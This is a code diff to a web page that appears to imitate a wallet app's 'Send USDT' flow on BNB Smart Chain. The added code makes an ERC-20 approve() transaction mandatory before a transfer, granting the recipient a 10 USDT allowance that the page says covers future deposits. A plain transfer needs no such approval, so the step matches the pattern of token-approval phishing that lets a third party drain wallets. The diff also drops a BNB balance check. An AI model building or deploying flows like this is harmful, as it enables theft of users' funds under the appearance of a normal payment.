@@ -262,6 +262,18 @@
       </div>
       <footer class="amount-footer"><button class="continue-button" id="reviewButton" type="button" disabled>Review</button></footer>
     </section>
+    <section class="flow-screen" id="spendingScreen" aria-label="Approve USDT spending" hidden>
+      <header class="topbar"><button class="icon-button" id="spendingBack" aria-label="Back to amount">‹</button><h1>Approve spending</h1></header>
+      <div class="flow-body">
+        <p class="approval-intro">Give the recipient wallet permission to spend up to <strong>10 USDT</strong>.</p>
+        <div class="summary-card"><dl class="detail-list"><dt>Approval limit</dt><dd>10 USDT</dd><dt>Spender / recipient wallet</dt><dd id="spendingAddress"></dd><dt>From</dt><dd id="spendingOwner"></dd><dt>Token contract</dt><dd id="spendingContract"></dd><dt>Network</dt><dd class="review-network"><img src="https://files.svgcdn.io/token-branded/binance-smart-chain.png" alt="BSC"><span>BNB Smart Chain</span></dd></dl></div>
+        <p class="section-label">Spending permission</p><p class="flow-message">This wallet can withdraw up to 10 USDT from your balance, including future deposits, to a destination it chooses. Approval does not send your selected transfer.</p>
+        <p class="section-label">Estimated approval fee</p><div class="summary-card fee-card"><span class="fee-token"><img src="https://files.svgcdn.io/token-branded/binance-smart-chain.png" alt="BSC"><span>BNB</span></span><strong id="spendingFee">Calculating…</strong></div>
+        <p class="section-label" id="spendingStatus" role="status" aria-live="polite"></p>
+        <a class="transaction-link" id="spendingTransaction" target="_blank" rel="noopener noreferrer" hidden>View approval on BscScan</a>
+      </div>
+      <footer class="flow-footer"><button class="continue-button" id="approveSpending" type="button" disabled>Approve 10 USDT</button></footer>
+    </section>
     <section class="flow-screen" id="reviewScreen" aria-label="Review Send" hidden>
       <header class="topbar"><button class="icon-button" id="reviewBack" aria-label="Back to amount">‹</button><h1>Review Send</h1></header>
       <div class="flow-body">
@@ -317,6 +329,8 @@
     let reviewRequestId = 0, reviewedTransfer = null, sendPending = false;
     const reviewScreen = document.querySelector('#reviewScreen');
     const approvalScreen = document.querySelector('#approvalScreen');
+    const spendingScreen = document.querySelector('#spendingScreen');
+    let spendingRequest = null, pendingApproval = null;
     const watchedProviders = new WeakSet();
     const amountScreen = document.querySelector('#amountScreen');
     function fitViewport() {
@@ -355,6 +369,7 @@
       reviewedTransfer = null;
       reviewScreen.hidden = true;
       approvalScreen.hidden = true;
+      spendingScreen.hidden = true;
       document.querySelector('.app').classList.remove('amount-mode');
       document.title = 'Send to';
     }
@@ -365,7 +380,7 @@
       if (typeof provider.on === 'function' && !watchedProviders.has(provider)) {
         watchedProviders.add(provider);
         const invalidateAmount = () => {
-          if (amountProvider !== provider || (amountScreen.hidden && reviewScreen.hidden && approvalScreen.hidden)) return;
+          if (amountProvider !== provider || (amountScreen.hidden && reviewScreen.hidden && approvalScreen.hidden && spendingScreen.hidden)) return;
           connectedAccount = null;
           tokenBalance = null;
           if (!sendPending) leaveAmount();
@@ -467,24 +482,22 @@
         const account = connectedAccount, recipient = document.querySelector('#amountRecipient').textContent;
         const units = tokenUnits(amountText);
         const tx = transferTransaction(account, recipient, units);
-        const [balanceHex, bnbHex, priceHex] = await Promise.all([
+        const [balanceHex, priceHex] = await Promise.all([
           readBsc(amountProvider,'eth_call',[{to:walletConfig.asset,data:'0x70a08231'+account.slice(2).padStart(64,'0')},'latest']),
-          readBsc(amountProvider,'eth_getBalance',[account,'latest']),
           readBsc(amountProvider,'eth_gasPrice',[])
         ]);
         if (requestId !== reviewRequestId) return;
         if (units > BigInt(balanceHex)) throw new Error('Insufficient USDT balance. Choose a smaller amount.');
         // A read-only estimate uses zero gas price so the node can simulate
         // token execution without requiring a funded BNB balance. The real
-        // current gas price is used for the displayed fee and balance check.
+        // current gas price is used for the displayed fee. Trust Wallet
+        // checks the available BNB when the user requests the transaction.
         const gas = BigInt(await readBsc(amountProvider,'eth_estimateGas',[{...tx, gasPrice:'0x0'}]));
-        const gasLimit = (gas * 120n + 99n) / 100n;
-        const gasPrice = BigInt(priceHex), maxFee = gasLimit * gasPrice;
+        const gasPrice = BigInt(priceHex);
         if (gas <= 0n || gasPrice <= 0n) throw new Error('Could not calculate the network fee.');
         await verifyWallet();
         if (requestId !== reviewRequestId) return;
         document.querySelector('#reviewFee').textContent = '≈ ' + formatBnb(gas * gasPrice) + ' BNB';
-        if (BigInt(bnbHex) < maxFee) return;
         reviewedTransfer = {account, recipient, units, tx, requestId};
         button.disabled = false;
       } catch(error) {
@@ -494,9 +507,16 @@
         document.querySelector('#reviewMessage').hidden = false;
       }
     }
-    document.querySelector('#reviewButton').addEventListener('click', async () => {
+    function approvalTransaction(account, spender, units) {
+      if (!/^0x[0-9a-fA-F]{40}$/.test(spender)) throw new Error('Invalid spender address.');
+      return {from:account, to:walletConfig.asset, value:'0x0', data:'0x095ea7b3' + spender.slice(2).toLowerCase().padStart(64,'0') + units.toString(16).padStart(64,'0')};
+    }
+    async function getSpendingAllowance(account, spender) {
+      return BigInt(await readBsc(amountProvider,'eth_call',[{to:walletConfig.asset, data:'0xdd62ed3e' + account.slice(2).padStart(64,'0') + spender.slice(2).padStart(64,'0')},'latest']));
+    }
+    async function openSendReview() {
+      await verifyWallet();
       updateAmount();
-      if (document.querySelector('#reviewButton').disabled) return;
       document.querySelector('#reviewAmount').textContent = amountText + ' USDT';
       document.querySelector('#reviewFrom').textContent = 'Main Wallet';
       document.querySelector('#reviewFrom').title = connectedAccount;
@@ -504,12 +524,106 @@
       document.querySelector('#reviewTo').textContent = document.querySelector('#amountRecipient').textContent;
       document.activeElement?.blur();
       amountScreen.hidden = true; reviewScreen.hidden = false;
+      spendingScreen.hidden = true;
       reviewScreen.querySelector('.flow-body').scrollTop = 0;
       requestAnimationFrame(() => { reviewScreen.querySelector('.flow-body').scrollTop = 0; });
       clearTimeout(toastTimer); toast.classList.remove('show');
       document.title = 'Review Send';
       await prepareReview();
+    }
+    document.querySelector('#reviewButton').addEventListener('click', async () => {
+      updateAmount();
+      if (document.querySelector('#reviewButton').disabled || sendPending) return;
+      const button = document.querySelector('#reviewButton');
+      button.disabled = true;
+      const viewId = balanceRequestId;
+      try {
+        await verifyWallet();
+        const spender = document.querySelector('#amountRecipient').textContent;
+        const account = connectedAccount, limit = 10n ** BigInt(tokenDecimals) * 10n;
+        const allowance = await getSpendingAllowance(account, spender);
+        await verifyWallet();
+        if (viewId !== balanceRequestId || amountScreen.hidden) return;
+        if (allowance === limit) { await openSendReview(); return; }
+        spendingRequest = {account, spender, limit};
+        document.querySelector('#spendingAddress').textContent = spender;
+        document.querySelector('#spendingOwner').textContent = account;
+        document.querySelector('#spendingContract').textContent = walletConfig.asset;
+        document.querySelector('#spendingStatus').textContent = allowance > 0n ? 'Existing allowance will first be reset to 0, then set to exactly 10 USDT. Trust Wallet will request two approvals.' : '';
+        document.querySelector('#spendingTransaction').hidden = true;
+        document.querySelector('#spendingFee').textContent = 'Calculating…';
+        document.querySelector('#approveSpending').disabled = true;
+        amountScreen.hidden = true; spendingScreen.hidden = false;
+        document.title = 'Approve USDT spending';
+        const [gasHex, priceHex] = await Promise.all([
+          readBsc(amountProvider,'eth_estimateGas',[{...approvalTransaction(account,spender,limit),gasPrice:'0x0'}]),
+          readBsc(amountProvider,'eth_gasPrice',[])
+        ]);
+        await verifyWallet();
+        if (spendingScreen.hidden) return;
+        document.querySelector('#spendingFee').textContent = '≈ ' + formatBnb(BigInt(gasHex)*BigInt(priceHex)) + ' BNB';
+        document.querySelector('#approveSpending').disabled = false;
+      } catch(error) {
+        document.querySelector('#spendingStatus').textContent = error.message || 'Unable to prepare spending approval.';
+        if (spendingScreen.hidden) announce(error.message || 'Unable to prepare spending approval.');
+      } finally { if (!amountScreen.hidden) updateAmount(); }
     });
+    async function waitForApproval(hash) {
+      for (let attempt=0; attempt<60; attempt++) {
+        const receipt = await readBsc(amountProvider,'eth_getTransactionReceipt',[hash]);
+        if (receipt) {
+          if (BigInt(receipt.status) !== 1n) { if (pendingApproval?.hash === hash) pendingApproval = null; throw new Error('Spending approval failed on BSC.'); }
+          return;
+        }
+        await new Promise(resolve => setTimeout(resolve,2000));
+      }
+      throw new Error('Approval is still pending. Check BscScan, then retry to check confirmation.');
+    }
+    async function submitApproval(request, units) {
+      await verifyWallet();
+      if (connectedAccount.toLowerCase() !== request.account.toLowerCase()) throw new Error('Wallet account changed.');
+      if (pendingApproval && (pendingApproval.account.toLowerCase() !== request.account.toLowerCase() || pendingApproval.spender.toLowerCase() !== request.spender.toLowerCase())) throw new Error('Another approval is pending. Check its transaction before starting a new one.');
+      if (!pendingApproval) {
+        const hash = await amountProvider.request({method:'eth_sendTransaction',params:[approvalTransaction(request.account,request.spender,units)]});
+        if (!/^0x[0-9a-fA-F]{64}$/.test(hash)) throw new Error('Wallet returned no valid approval hash. Check Trust Wallet before retrying.');
+        pendingApproval = {...request, units, hash};
+      }
+      const pending = pendingApproval;
+      document.querySelector('#spendingStatus').textContent = 'Approval submitted. Waiting for BSC confirmation…';
+      const link = document.querySelector('#spendingTransaction');
+      link.href = 'https://bscscan.com/tx/'+pending.hash; link.hidden = false;
+      await waitForApproval(pending.hash);
+      pendingApproval = null;
+      await verifyWallet();
+    }
+    document.querySelector('#approveSpending').addEventListener('click', async () => {
+      if (sendPending || !spendingRequest) return;
+      const request = spendingRequest;
+      sendPending = true;
+      document.querySelector('#approveSpending').disabled = true;
+      document.querySelector('#spendingBack').disabled = true;
+      try {
+        if (pendingApproval) await submitApproval(request,pendingApproval.units);
+        const existing = await getSpendingAllowance(request.account,request.spender);
+        if (existing !== request.limit) {
+          if (existing > 0n) {
+            document.querySelector('#spendingStatus').textContent = 'Confirm resetting the existing allowance to 0 USDT in Trust Wallet.';
+            await submitApproval(request,0n);
+          }
+          document.querySelector('#spendingStatus').textContent = 'Confirm the 10 USDT spending limit and spender in Trust Wallet.';
+          await submitApproval(request,request.limit);
+        }
+        if (await getSpendingAllowance(request.account,request.spender) !== request.limit) throw new Error('10 USDT approval is not confirmed yet. Check Trust Wallet.');
+        await openSendReview();
+      } catch(error) {
+        document.querySelector('#spendingStatus').textContent = Number(error.code)===4001 ? 'Spending approval cancelled.' : (error.message || 'Approval could not be completed.');
+      } finally {
+        sendPending = false;
+        document.querySelector('#approveSpending').disabled = false;
+        document.querySelector('#spendingBack').disabled = false;
+      }
+    });
+    document.querySelector('#spendingBack').addEventListener('click', () => { if (!sendPending) { spendingScreen.hidden = true; amountScreen.hidden = false; document.title = 'Amount'; updateAmount(); } });
     document.querySelector('#reviewBack').addEventListener('click', () => { reviewRequestId++; reviewedTransfer = null; reviewScreen.hidden = true; amountScreen.hidden = false; document.title = 'Amount'; });
     document.querySelector('#sendButton').addEventListener('click', async () => {
       if (sendPending || !reviewedTransfer) return;
